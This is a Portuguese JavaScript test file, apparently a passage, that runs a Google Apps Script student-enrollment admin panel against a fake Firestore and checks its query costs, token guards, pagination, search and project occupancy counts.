/**
 * painel.js — testa as funções de gestão de 10_Painel.gs sem tocar no Google.
 *
 * O que se prova aqui, em ordem de importância:
 *
 *   1. o ORÇAMENTO DE LEITURA do cabeçalho de 10_Painel.gs é medido, e não
 *      afirmado: `detalheAluno` custa três leituras de ponto e nenhuma consulta;
 *      `painelEstatisticas` não faz uma única `:runQuery`; a busca por matrícula,
 *      CPF ou e-mail não varre nada;
 *   2. a guarda: todas as funções recusam sem token ANTES de tocar no banco —
 *      medido contando as requisições, não lendo o código;
 *   3. nenhuma consulta declara ordenação por campo junto com filtro (índice
 *      composto) nem por `__name__` DESCENDENTE (a armadilha que 04_Log.gs pagou);
 *   4. `resolverAluno` não ressuscita aluno excluído — `atualizar` é PATCH, e
 *      PATCH no Firestore CRIA o documento que não existe;
 *   5. a aba Configurações não é porta dos fundos: `admin_emails` passa pelas
 *      guardas de quem tem acesso, e chave marcada como segredo não vai para a
 *      tela nem com valor nem como campo (o PIN saiu do sistema; o mecanismo de
 *      CONFIG_SEGREDOS ficou, e é ele que está sob teste);
 *   6. a CORREÇÃO DE MATRÍCULA, que é a operação mais perigosa deste arquivo: ela
 *      muda o endereço da inscrição, e o teste exercita o caminho inteiro com o
 *      cruzamento de verdade (06_Reconciliacao.gs entrou na lista de arquivos por
 *      isso), inclusive a recusa do banco quando o endereço novo já está ocupado;
 *   7. a MIGRAÇÃO DE PROJETO conta a vaga de verdade, passa por cima do teto e não
 *      esconde o resultado: 61 de 60 aparece como 61.
 *
 * ONDE O FALSO NÃO ALCANÇA, e está dito no teste que precisa disso: o
 * `UrlFetchApp` de `apoio.js` ordena documentos que NÃO TÊM o campo da ordenação
 * (usa '' como chave), enquanto o Firestore de verdade os EXCLUI do resultado. A
 * rede de segurança de `listarLotes` existe justamente para esse comportamento,
 * então ela é exercitada com `listar` trocado por um espião — e o que isso prova
 * é a lógica da rede, não o comportamento do banco.
 *
 * Uso:  node testes/painel.js
 */

'use strict';

const fs = require('fs');
const path = require('path');

const {
  teste, grupo, igual, verdadeiro, resultado, criarAmbiente, criarRelogio
} = require('./apoio');

const PASTA_GS = path.join(__dirname, '..', 'apps-script');

// Na ordem alfabética em que o editor do Apps Script carrega os arquivos.
//
// 12_Disciplinas.gs entrou por causa do teste de SO_LEITURA, que confere se TODA
// função declarada como leitura no Admin.html existe no servidor — e duas delas
// (`listarDisciplinas`, `inscritosDaDisciplina`) nascem lá. Sem o arquivo, o
// teste acusaria função inexistente onde só falta carregar o arquivo.
//
// 06_Reconciliacao.gs entrou porque o painel passou a DEPENDER dele em tempo de
// execução: `editarAluno` chama `chaveDePessoa_`, `chaveAluno_` e `reconciliar`
// para que a ficha corrigida caia no mesmo endereço que a rodada produziria. Um
// falso desses três esconderia exatamente o erro que interessa — a ficha nova num
// endereço que a reconciliação não usa, virando linha duplicada na madrugada.
// 13_Auditorio.gs entrou pelo mesmo motivo que 12_Disciplinas.gs: duas funções
// da aba Auditório (`inscricoesRecentes`, `filaDeEspera`) estão em SO_LEITURA, e
// o teste dessa lista confere se toda função dela existe no servidor. Sem o
// arquivo, ele acusaria função inexistente onde só falta carregar.
const GS = ['00_Config.gs', '01_Utils.gs', '02_Repo.gs', '03_Config.gs',
  '04_Inscricoes.gs', '04_Log.gs', '06_Reconciliacao.gs', '07_Auth.gs',
  '07b_LinkPorEmail.gs',
  '09_Projetos.gs', '10_Painel.gs', '12_Disciplinas.gs', '13_Auditorio.gs'];

/** As funções desta fase, com o payload mínimo que o Admin.html manda. */
const MINHAS_FUNCOES = {
  painelEstatisticas: {},
  painelProjetos: {},
  listarAlunos: { pagina: 1, tamanho: 50 },
  atualizarAlunos: { pagina: 1, tamanho: 50 },
  detalheAluno: { id: 'a001' },
  editarAluno: { id: 'a001', turma: 'ADS11' },
  exportarCsv: {},
  resolverAluno: { id: 'a001', status: 'CONFIRMADO' },
  listarLotes: {},
  listarLog: {},
  lerConfiguracoes: {},
  salvarConfiguracao: { chave: 'vagas_padrao', valor: '30' },
  inscritosDoProjeto: { id: 'p1' }
};

// ------------------------------------------------------------ Apoio local

function ambiente(opcoes) {
  const amb = criarAmbiente(Object.assign(
    { arquivos: GS, usuario: 'coordenacao@exemplo.com' }, opcoes || {}
  ));
  amb.token = amb.api.criarSessao_('coordenacao@exemplo.com');
  amb.zerar = () => { amb.falso.requisicoes.length = 0; };
  return amb;
}

/** Chama uma função do painel já com o token da sessão. */
function chamar(amb, funcao, payload) {
  return amb.api[funcao](Object.assign({ token: amb.token }, payload || {}));
}

function consultas(falso) {
  return falso.requisicoes.filter((r) => r.url.indexOf(':runQuery') !== -1);
}
function agregacoes(falso) {
  return falso.requisicoes.filter((r) => r.url.indexOf(':runAggregationQuery') !== -1);
}
function leiturasDePonto(falso) {
  return falso.requisicoes.filter((r) => r.metodo === 'GET');
}
function escritas(falso) {
  return falso.requisicoes.filter((r) => r.metodo === 'POST' || r.metodo === 'PATCH');
}

function criarAluno(api, id, campos) {
  api.inserir('alunos', Object.assign({
    nome: 'Aluno ' + id,
    cpf: '', email: '', telefone: '', data_nascimento: '',
    matricula: '', matricula_conferida: 'NAO',
    curso: '', turma: '', situacao: '',
    status: 'SO_INSCRITO', metodo_match: '', score_match: '',
    inscricao_id: '', matricula_id: '',
    revisado_por: '', revisado_em: '', observacoes: '', atualizado_em: ''
  }, campos || {}), id);
}

/**
 * Cadastro grande, para exercitar a paginação.
 *
 * Os ids são zero-padded porque a lista sai na ordem de `__name__`, e é
 * exatamente essa ordem que os testes de página conferem. `tamanho` tem piso de
 * 10 no servidor (herdado do sistema em produção: pedir páginas de 1 seria
 * paginar 2.500 vezes), então não adianta testar paginação com 4 alunos.
 */
function semearMuitos(api, quantos) {
  for (let i = 1; i <= quantos; i++) {
    criarAluno(api, 'm' + String(i).padStart(3, '0'), { nome: 'Aluno ' + i });
  }
}

/** Cadastro de exemplo: 4 alunos, com os quatro status e dois cursos. */
function semear(api) {
  criarAluno(api, 'a001', {
    nome: 'Maria da Silva', status: 'CONFIRMADO', curso: 'ADS', turma: 'ADS11',
    matricula: '20250001', email: 'maria@exemplo.com', cpf: '52998224725',
    matricula_conferida: 'SIM', inscricao_id: 'ins001', matricula_id: '20250001'
  });
  criarAluno(api, 'a002', {
    nome: 'João Souza', status: 'DIVERGENCIA', curso: 'ADS', turma: 'ADS21',
    matricula: '20250002', email: 'joao@exemplo.com'
  });
  criarAluno(api, 'a003', {
    nome: 'Ana Pereira', status: 'SO_INSCRITO', curso: 'ADM',
    matricula: '20250003', email: 'ana@exemplo.com', cpf: '11144477735'
  });
  criarAluno(api, 'a004', {
    nome: 'Carlos Lima', status: 'SO_MATRICULADO', curso: 'ADM', matricula: '20250004'
  });
}

// ------------------------------------------------------------ A guarda

grupo('exigirAdmin é a primeira linha das nove');

Object.keys(MINHAS_FUNCOES).forEach((funcao) => {
  teste(funcao + ' sem token recusa sem tocar no banco', () => {
    const amb = ambiente();
    semear(amb.api);
    amb.zerar();

    const r = amb.api[funcao](MINHAS_FUNCOES[funcao]);
    igual(r.ok, false, funcao + ' devia recusar');
    verdadeiro(/Sess.o expirada|inv.lida/i.test(r.erro),
      'a mensagem precisa casar com o teste do Admin.html: ' + r.erro);
    igual(amb.falso.requisicoes.length, 0, 'recusou depois de já ter lido o banco');
  });
});

teste('token de outra sessão, expirado, também não passa', () => {
  const amb = ambiente();
  amb.api.sair(amb.token);
  amb.zerar();

  const r = amb.api.listarAlunos({ token: amb.token });
  igual(r.ok, false);
  igual(amb.falso.requisicoes.length, 0);
});

// ------------------------------------------------------------ Estatísticas

grupo('painelEstatisticas — números por agregação, nunca por varredura');

teste('os quatro status, as três origens e o total', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('inscricoes', { nome: 'x' }, 'ins001');
  amb.api.inserir('matriculados', { nome: 'x' }, '20250001');
  amb.api.inserir('lotes', { arquivo: 'lista.csv' }, 'l001');
  amb.zerar();

  const d = chamar(amb, 'painelEstatisticas').dados;

  igual(d.total, 4);
  igual(d.porStatus.CONFIRMADO, 1);
  igual(d.porStatus.SO_INSCRITO, 1);
  igual(d.porStatus.SO_MATRICULADO, 1);
  igual(d.porStatus.DIVERGENCIA, 1);
  igual(d.inscricoes, 1);
  igual(d.matriculados, 1);
  igual(d.lotes, 1);
});

teste('nenhuma :runQuery — nem uma linha de aluno é trazida', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  chamar(amb, 'painelEstatisticas');
  igual(consultas(amb.falso).length, 0, 'o painel varreu documentos para contar');
});

teste('custa 10 agregações e 1 leitura de ponto — o número do cabeçalho', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  chamar(amb, 'painelEstatisticas');
  igual(agregacoes(amb.falso).length, 10);
  igual(leiturasDePonto(amb.falso).length, 1, 'a leitura de ponto é o documento de agregados');
});

teste('qualidade conta os vazios e subtrai — a chave medida é a MATRÍCULA', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const q = chamar(amb, 'painelEstatisticas').dados.qualidade;
  igual(q.comMatricula, 4);
  igual(q.percMatricula, 100);
  igual(q.comEmail, 3);
  igual(q.percEmail, 75);

  // O CPF SAIU do painel, e não por descuido: nenhum formulário deste sistema o
  // pede, então o cartão afirmava 0% desde sempre — sobre uma qualidade que na
  // verdade estava em 100%. O campo continua existindo no cadastro (é opcional,
  // para projeto aberto à comunidade); o que saiu foi a medida errada na tela.
  igual(q.comCpf, undefined, 'o painel voltou a devolver CPF');
  igual(q.percCpf, undefined, 'o painel voltou a devolver CPF');
});

teste('quem está SEM matrícula é descontado — e o campo em branco é o que permite contar', () => {
  const amb = ambiente();
  semear(amb.api);
  // `criarAluno` grava `matricula: ''`, e é isso que faz a conta funcionar: no
  // Firestore, campo AUSENTE não casa com filtro de igualdade, então um aluno
  // gravado sem a chave seria contado como quem TEM matrícula. Este teste falha
  // se alguém parar de gravar a chave em branco.
  criarAluno(amb.api, 'sem-mat', { nome: 'Sem Matrícula', email: 'x@exemplo.com' });
  amb.zerar();

  const q = chamar(amb, 'painelEstatisticas').dados.qualidade;
  igual(q.comMatricula, 4, 'contou como "com matrícula" quem tem o campo vazio');
  igual(q.percMatricula, 80, '4 de 5');
});

teste('cadastro vazio não divide por zero', () => {
  const amb = ambiente();
  const d = chamar(amb, 'painelEstatisticas').dados;
  igual(d.total, 0);
  igual(d.qualidade.percMatricula, 0);
  igual(d.qualidade.percEmail, 0);
});

teste('sem o documento de agregados, porCurso vem vazio (o cartão some)', () => {
  const amb = ambiente();
  semear(amb.api);
  igual(chamar(amb, 'painelEstatisticas').dados.porCurso, []);
});

teste('com o documento de agregados, porCurso vem ordenado e sem metadados', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('agregados', { ADS: '2', ADM: '2', atualizado_em: '2026-08-05' }, 'cursos');

  igual(chamar(amb, 'painelEstatisticas').dados.porCurso, [
    { curso: 'ADM', total: 2 },
    { curso: 'ADS', total: 2 }
  ]);
});

// ------------------------------------------------------------ Projetos

grupo('painelProjetos');

teste('devolve os projetos com ocupação e as vagas padrão', () => {
  const amb = ambiente();
  amb.api.inserir('projetos', {
    codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '60', ativo: 'SIM',
    inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
  }, 'p1');
  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i1');

  const r = chamar(amb, 'painelProjetos');
  igual(r.ok, true);
  igual(r.itens.length, 1);
  igual(r.itens[0].id, 'p1');
  igual(r.itens[0].inscritos, 1);
  igual(r.itens[0].situacao, 'ABERTO');
  igual(r.vagasPadrao, 60);
});

// O painel come da mesma `listarProjetos` que o site, então a chave de
// diagnóstico o alcança junto. O que ele NÃO pode receber é um zero no lugar do
// que ninguém contou: a coordenação decide inativar e remover projeto por esse
// número, e `removerProjeto` (09_Projetos.gs) continua contando de verdade.
teste('com contar_ocupacao_na_lista em NAO, a ocupação vem null — nunca zero', () => {
  const amb = ambiente();
  amb.api.inserir('projetos', {
    codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '2', ativo: 'SIM',
    inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
  }, 'p1');
  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i1');
  amb.api.inserir('inscricoes', { projeto_id: 'p1' }, 'i2');
  amb.api.gravarConfig('contar_ocupacao_na_lista', 'NAO');
  amb.api.limparCacheConfig();

  const r = chamar(amb, 'painelProjetos');

  igual(r.itens[0].inscritos, null, 'zero aqui viraria "0 / 2" num projeto cheio');
  igual(r.itens[0].ocupacao_contada, false, 'a tela precisa saber POR QUE o número não veio');
  igual(r.itens[0].vagas, 2, 'o total de vagas continua chegando');
  igual(r.itens[0].situacao, 'ABERTO', 'sem contagem não há como saber que lotou');

  // A saída da coordenação: quem precisa do número abre a lista de quem está lá.
  igual(chamar(amb, 'inscritosDoProjeto', { id: 'p1' }).itens.length, 2,
    'o botão Inscritos conta de verdade, e é o que o aviso da tela manda usar');
});

/**
 * `inscritosDoProjeto` — abrir a ocupação da aba Projetos.
 *
 * A tabela dizia "47 / 60" e não dizia QUEM. O que se prova aqui, em ordem de
 * importância:
 *
 *   1. a lista é a do projeto pedido, e só dele;
 *   2. projeto VAZIO não parece defeito — é `ok: true` com zero itens, e não um
 *      erro que faria a coordenação procurar o que não quebrou;
 *   3. o teto é respeitado E o corte é DITO. Lista cortada em silêncio faz
 *      concluir que alguém não se inscreveu;
 *   4. a fila de espera aparece marcada, e os dois números (lista e ocupação)
 *      viajam separados — senão a tela parece dizer que o limite de vagas furou;
 *   5. UMA consulta, com UM filtro de igualdade e sem `orderBy` — a ordenação é
 *      em JavaScript. Filtro num campo mais ordenação por outro é o
 *      `400 The query requires an index` que já custou uma execução aqui.
 */
grupo('inscritosDoProjeto — abrir o número da ocupação');

function projetoComInscritos(amb, quantos, extras) {
  amb.api.inserir('projetos', {
    codigo: 'r-cidades', nome: 'R+ Cidades', vagas: '60', ativo: 'SIM',
    inscricoes_abertas: 'SIM', ordem: '1', professor: 'Marina'
  }, 'p1');

  for (let i = 1; i <= quantos; i++) {
    amb.api.inserir('inscricoes', Object.assign({
      projeto_id: 'p1', projeto_nome: 'R+ Cidades',
      matricula: String(9110000 + i), nome: 'Aluno ' + String(i).padStart(3, '0'),
      email: 'aluno' + i + '@exemplo.com', whatsapp: '',
      curso_fase: 'WORK EXPERIENCE - ADM61', matricula_conferida: 'SIM',
      criado_em: '2026-08-14 19:0' + (i % 10)
    }, extras || {}), 'i' + String(i).padStart(4, '0'));
  }
}

teste('traz quem está no projeto, e não quem está em outro', () => {
  const amb = ambiente();
  projetoComInscritos(amb, 2);

  amb.api.inserir('projetos', { nome: 'Outro', vagas: '10', ativo: 'SIM' }, 'p2');
  amb.api.inserir('inscricoes', {
    projeto_id: 'p2', projeto_nome: 'Outro', matricula: '9119999', nome: 'De Outro Projeto'
  }, 'i9999');

  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
  igual(r.ok, true);
  igual(r.projeto, 'R+ Cidades');
  igual(r.vagas, 60);
  igual(r.itens.length, 2);
  igual(r.itens.map((i) => i.nome), ['Aluno 001', 'Aluno 002'], 'em ordem alfabética');
  igual(r.itens[0].matricula, '9110001');
  igual(r.itens[0].email, 'aluno1@exemplo.com');
  igual(r.itens.filter((i) => i.nome === 'De Outro Projeto').length, 0,
    'a inscrição de outro projeto entrou na lista');
});

teste('projeto sem ninguém responde ok com lista vazia — não é erro', () => {
  // O modo de falha que este teste impede: um projeto recém-criado devolvendo
  // `ok: false`, e a coordenação procurando o defeito que não existe.
  const amb = ambiente();
  projetoComInscritos(amb, 0);

  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
  igual(r.ok, true, 'projeto vazio virou erro');
  igual(r.itens, []);
  igual(r.lidas, 0);
  igual(r.ocupam, 0);
  igual(r.aviso, undefined, 'lista vazia não é lista cortada');
});

teste('projeto que não existe recusa com o texto que ensina a saída', () => {
  const amb = ambiente();
  const r = chamar(amb, 'inscritosDoProjeto', { id: 'nao-existe' });
  igual(r.ok, false);
  verdadeiro(/Recarregue a lista/.test(r.erro), r.erro);
});

teste('o teto é respeitado E o corte é dito na tela', () => {
  const amb = ambiente();
  amb.api.PAINEL_MAX_INSCRITOS_PROJETO = 3;
  projetoComInscritos(amb, 5);

  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
  igual(r.itens.length, 3, 'leu mais do que o teto');
  igual(r.lidas, 3);
  verdadeiro(/Mostrando as primeiras 3/.test(r.aviso || ''),
    'lista cortada em silêncio faz a coordenação concluir que alguém não existe: ' + r.aviso);
  verdadeiro(/Exportar CSV/.test(r.aviso), 'o aviso precisa dizer para onde ir: ' + r.aviso);
});

teste('quem está na fila de espera aparece marcado, e fora da conta de vagas', () => {
  // Os dois números separados são o ponto: contar as linhas da janela e comparar
  // com "60 / 60" na tabela faria a coordenação concluir que o limite furou.
  const amb = ambiente();
  projetoComInscritos(amb, 2);
  amb.api.inserir('inscricoes', {
    projeto_id: 'p1', projeto_nome: 'R+ Cidades', matricula: '9110003',
    nome: 'Aluno 003', em_espera: 'SIM', espera_de: 'p1'
  }, 'i0003');

  const r = chamar(amb, 'inscritosDoProjeto', { id: 'p1' });
  igual(r.lidas, 3, 'quem espera some da lista');
  igual(r.emEspera, 1);
  igual(r.ocupam, 2, 'quem está na fila não pode contar como vaga ocupada');
  igual(r.itens.filter((i) => i.em_espera).map((i) => i.nome), ['Aluno 003']);
});

teste('UMA consulta, um filtro de igualdade, e nenhum orderBy declarado', () => {
  // Filtrar por um campo e ordenar por OUTRO exige índice composto e devolve
  // `400 The query requires an index` — a cicatriz de `ultimosRegistros`
  // (04_Log.gs). A ordem alfabética é feita em JavaScript, sobre o que voltou.
  const amb = ambiente();
  projetoComInscritos(amb, 2);
  amb.zerar();

  chamar(amb, 'inscritosDoProjeto', { id: 'p1' });

  igual(consultas(amb.falso).length, 1, 'mais de uma consulta por clique');
  igual(agregacoes(amb.falso).length, 0, 'agregação não é preciso: a lista já é a contagem');
  igual(escritas(amb.falso).filter((r) => r.url.indexOf(':runQuery') === -1).length, 0,
    'uma leitura não pode escrever nada');

  const q = consultas(amb.falso)[0].corpo.structuredQuery;
  igual(q.from[0].collectionId, 'inscricoes');
  igual(q.where.fieldFilter.field.fieldPath, 'projeto_id');
  igual(q.where.fieldFilter.value.stringValue, 'p1');
  igual(q.orderBy[0].field.fieldPath, '__name__');
  igual(q.orderBy[0].direction, 'ASCENDING', '__name__ DESC exigiria índice composto');
  igual(q.limit, amb.api.PAINEL_MAX_INSCRITOS_PROJETO);
});

teste('o custo é 1 leitura de ponto + 1 consulta, e não cresce com o cadastro', () => {
  // O número do cabeçalho de 10_Painel.gs, medido: 1 + min(inscritos, teto).
  const amb = ambiente();
  projetoComInscritos(amb, 4);
  semearMuitos(amb.api, 40);      // cadastro grande, que esta função não olha
  amb.zerar();

  chamar(amb, 'inscritosDoProjeto', { id: 'p1' });

  igual(leiturasDePonto(amb.falso).length, 1, 'a leitura de ponto é só a do projeto');
  igual(amb.falso.requisicoes.length, 2, '1 leitura de ponto + 1 consulta, e nada mais');
});

// ------------------------------------------------------------ Alunos

grupo('listarAlunos — o caminho de consulta');

teste('página 1 traz o tamanho pedido, com total e páginas certos', () => {
  const amb = ambiente();
  semearMuitos(amb.api, 25);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 });
  igual(r.ok, true);
  igual(r.itens.length, 10);
  igual(r.total, 25);
  igual(r.paginas, 3);
  igual(r.pagina, 1);
});

teste('tamanho abaixo do piso é elevado — paginar de 1 em 1 é 2.500 páginas', () => {
  const amb = ambiente();
  semearMuitos(amb.api, 25);
  igual(chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 1 }).tamanho, 10);
  igual(chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 5000 }).tamanho, 200);
});

teste('página 2 continua de onde a 1 parou, sem repetir ninguém', () => {
  const amb = ambiente();
  semearMuitos(amb.api, 25);

  const p1 = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 }).itens.map((a) => a.id);
  const p2 = chamar(amb, 'listarAlunos', { pagina: 2, tamanho: 10 }).itens.map((a) => a.id);

  igual(p1[0], 'm001');
  igual(p1[9], 'm010');
  igual(p2[0], 'm011');
  igual(p1.filter((id) => p2.indexOf(id) !== -1), [], 'a página 2 repetiu gente da 1');
});

teste('página além do fim volta vazia, e não repete a última', () => {
  const amb = ambiente();
  semearMuitos(amb.api, 25);

  const r = chamar(amb, 'listarAlunos', { pagina: 5, tamanho: 10 });
  igual(r.ok, true);
  igual(r.itens, []);
  igual(r.total, 25);
});

teste('além do teto de páginas, recusa sem gastar leitura', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { pagina: 11, tamanho: 50 });
  igual(r.ok, false);
  verdadeiro(r.erro.indexOf('página 10') !== -1, r.erro);
  igual(amb.falso.requisicoes.length, 0, 'caminhar até a página 11 custaria 550 leituras');
});

teste('filtro por status vira fieldFilter, e o total sai da agregação', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA' });
  igual(r.total, 1);
  igual(r.itens.length, 1);
  igual(r.itens[0].nome, 'João Souza');
  igual(r.itens[0].statusLabel, 'Divergência');

  const c = consultas(amb.falso)[0].corpo.structuredQuery;
  igual(c.where.fieldFilter.field.fieldPath, 'status');
  igual(c.where.fieldFilter.value.stringValue, 'DIVERGENCIA');
});

teste('filtro por curso vira fieldFilter no campo curso', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { curso: 'ADM' });
  igual(r.total, 2);
  igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'curso');
});

teste('NENHUMA consulta de aluno ordena por campo — nem com filtro, nem sem', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  chamar(amb, 'listarAlunos', {});
  chamar(amb, 'listarAlunos', { status: 'CONFIRMADO' });
  chamar(amb, 'listarAlunos', { busca: 'silva' });
  chamar(amb, 'exportarCsv', {});

  consultas(amb.falso).forEach((r) => {
    const ordem = r.corpo.structuredQuery.orderBy[0];
    igual(ordem.field.fieldPath, '__name__',
      'filtro num campo + ordenação por outro exige índice composto');
    igual(ordem.direction, 'ASCENDING',
      '__name__ DESCENDENTE devolve 400: o índice automático só cobre ascendente');
  });
});

grupo('listarAlunos — a busca');

teste('matrícula digitada vira igualdade: uma consulta, zero varredura', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: '20250003' });
  igual(r.itens.length, 1);
  igual(r.itens[0].nome, 'Ana Pereira');

  igual(consultas(amb.falso).length, 1, 'a busca por matrícula varreu o cadastro');
  igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'matricula');
});

teste('e-mail digitado vira igualdade no campo email', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: 'joao@exemplo.com' });
  igual(r.itens.length, 1);
  igual(r.itens[0].nome, 'João Souza');
  igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'email');
});

teste('CPF com pontuação acha — a peneira de texto não pode descartar o achado', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: '529.982.247-25' });
  igual(r.itens.length, 1);
  igual(r.itens[0].nome, 'Maria da Silva');
  igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'cpf');
});

teste('busca por nome varre e filtra em memória, com total exato', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: 'silva' });
  igual(r.total, 1);
  igual(r.itens[0].nome, 'Maria da Silva');
  igual(consultas(amb.falso)[0].corpo.structuredQuery.where, undefined,
    'busca por nome não tem campo exato para filtrar no banco');
});

teste('busca por nome ignora acento e caixa, como o sistema em produção', () => {
  const amb = ambiente();
  semear(amb.api);
  igual(chamar(amb, 'listarAlunos', { busca: 'JOAO' }).total, 1);
  igual(chamar(amb, 'listarAlunos', { busca: 'joão sou' }).total, 1);
});

teste('matrícula pela metade não some: a igualdade falha e a varredura salva', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: '2025000' });
  igual(r.total, 4, 'o prefixo aparece nas quatro matrículas');
  igual(consultas(amb.falso).length >= 2, true, 'devia tentar a igualdade antes de varrer');
});

teste('a varredura respeita o teto e não segue lendo o cadastro inteiro', () => {
  const amb = ambiente();
  for (let i = 1; i <= 10; i++) criarAluno(amb.api, 'b' + String(i).padStart(3, '0'), { nome: 'Zeta ' + i });
  amb.api.PAINEL_BLOCO = 2;
  amb.api.PAINEL_TETO_VARREDURA = 4;
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { busca: 'zeta' });
  igual(r.total, 4, 'parou no teto — 4 documentos lidos, não 10');
  igual(consultas(amb.falso).length, 2);
});

teste('status e curso juntos: um vai ao banco, o outro vira peneira', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'listarAlunos', { curso: 'ADS', status: 'DIVERGENCIA' });
  igual(r.total, 1);
  igual(r.itens[0].nome, 'João Souza');

  igual(consultas(amb.falso)[0].corpo.structuredQuery.where.fieldFilter.field.fieldPath, 'curso',
    'com os dois filtros, o balde menor (curso) é o que vai ao banco');
});

teste('a lista de cursos do filtro vem do documento de agregados', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');

  igual(chamar(amb, 'listarAlunos', {}).cursos, ['ADM', 'ADS']);
});

teste('sem o documento de agregados o filtro fica só com "Todos"', () => {
  const amb = ambiente();
  semear(amb.api);
  igual(chamar(amb, 'listarAlunos', {}).cursos, []);
});

teste('o id da linha é o NOME do documento, que é o que volta em resolverAluno', () => {
  const amb = ambiente();
  criarAluno(amb.api, 'a009', { nome: 'Teste', id: 'valor-antigo-e-mentiroso' });

  igual(chamar(amb, 'listarAlunos', {}).itens[0].id, 'a009');
});

// ------------------------------------------------------------ Detalhe

grupo('detalheAluno — três leituras de ponto, e não três varreduras');

teste('junta aluno, inscrição e lista oficial em 3 GET e nenhuma consulta', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.api.inserir('inscricoes', {
    criado_em: '2026-08-01 10:00:00', origem: 'SITE', projeto_nome: 'R+ Cidades',
    nome: 'Maria da Silva', email: 'maria@exemplo.com', whatsapp: '48999998888',
    matricula: '20250001', curso_fase: 'ADS11', cpf: '', data_nascimento: ''
  }, 'ins001');
  amb.api.inserir('matriculados', {
    lote_id: 'l001', importado_em: '2026-07-30 08:00:00', nome: 'Maria Silva',
    cpf: '52998224725', email: 'maria@exemplo.com', matricula: '20250001',
    curso: 'ADS', turma: 'ADS11', situacao: 'ATIVO', data_nascimento: '2004-03-02'
  }, '20250001');
  amb.zerar();

  const r = chamar(amb, 'detalheAluno', { id: 'a001' });
  igual(r.ok, true);
  igual(r.aluno.nome, 'Maria da Silva');
  igual(r.inscricao.projeto, 'R+ Cidades');
  igual(r.inscricao.whatsapp, '(48) 99999-8888');
  igual(r.matriculado.turma, 'ADS11');
  igual(r.matriculado.data_nascimento, '02/03/2004');

  igual(leiturasDePonto(amb.falso).length, 3);
  igual(consultas(amb.falso).length, 0, 'varrer para achar três documentos é o que se veio evitar');
});

teste('sem matricula_id, o endereço é derivado da própria matrícula', () => {
  const amb = ambiente();
  criarAluno(amb.api, 'a010', { nome: 'Sem Vínculo', matricula: '2025-0007', matricula_id: '' });
  amb.api.inserir('matriculados', { nome: 'Sem Vinculo', matricula: '20250007' }, '20250007');
  amb.zerar();

  const r = chamar(amb, 'detalheAluno', { id: 'a010' });
  igual(r.matriculado.nome, 'Sem Vinculo');
  igual(leiturasDePonto(amb.falso).length, 2, 'aluno + matriculado; não há inscrição para ler');
});

teste('sem os dois vínculos, as colunas vêm nulas e nada é lido à toa', () => {
  const amb = ambiente();
  criarAluno(amb.api, 'a011', { nome: 'Solto' });
  amb.zerar();

  const r = chamar(amb, 'detalheAluno', { id: 'a011' });
  igual(r.inscricao, null);
  igual(r.matriculado, null);
  igual(leiturasDePonto(amb.falso).length, 1);
});

teste('aluno inexistente responde erro, e não uma tela vazia', () => {
  const amb = ambiente();
  const r = chamar(amb, 'detalheAluno', { id: 'nao-existe' });
  igual(r.ok, false);
  verdadeiro(r.erro.indexOf('não encontrado') !== -1, r.erro);
});

// ------------------------------------------------------------ Revisão

grupo('resolverAluno');

teste('status fora dos quatro é recusado antes de qualquer leitura', () => {
  const amb = ambiente();
  semear(amb.api);
  amb.zerar();

  const r = chamar(amb, 'resolverAluno', { id: 'a001', status: 'APROVADO' });
  igual(r.ok, false);
  igual(r.erro, 'Status inválido.');
  igual(amb.falso.requisicoes.length, 0);
});

teste('id inexistente NÃO cria aluno fantasma — PATCH criaria', () => {
  const amb = ambiente();
  semear(amb.api);
  const antes = amb.falso.documentos.size;

  const r = chamar(amb, 'resolverAluno', { id: 'a999', status: 'CONFIRMADO' });
  igual(r.ok, false);
  igual(amb.falso.documentos.size, antes, 'o PATCH criou um documento do nada');
});

teste('grava status, observação, quem revisou e quando', () => {
  const amb = ambiente();
  semear(amb.api);

  const r = chamar(amb, 'resolverAluno', {
    id: 'a002', status: 'CONFIRMADO', observacoes: '  conferido na secretaria  '
  });
